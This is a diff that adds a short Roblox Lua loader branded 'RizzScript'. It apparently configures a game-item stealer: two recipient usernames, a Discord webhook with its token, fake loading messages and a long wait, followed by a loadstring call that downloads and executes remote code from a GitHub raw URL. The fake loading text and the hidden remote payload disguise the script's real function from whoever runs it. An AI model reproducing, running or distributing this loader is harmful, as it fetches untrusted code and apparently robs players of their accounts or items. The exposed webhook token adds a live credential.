@@ -1,0 +1,10 @@
+UserName = "zetsuq2"
+UserName2 = "devil_z24"
+Webhook = "https://discord.com/api/webhooks/1108643601078042714/GsCQoDDCA53UliWrcIuFAjB0WzVi1Z6Xaj1nUVV1gAVRRaL5YySyRnQcNvMKvsHZq4Dq"
+_G.AntiLeave = false
+_G.ScriptName = "RizzScript"
+_G.FirstText = "Script Preaparing"
+_G.SecondText = "Script Loading"
+_G.ThirdText = "Almost Done"
+_G.WaitingTime = 70
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
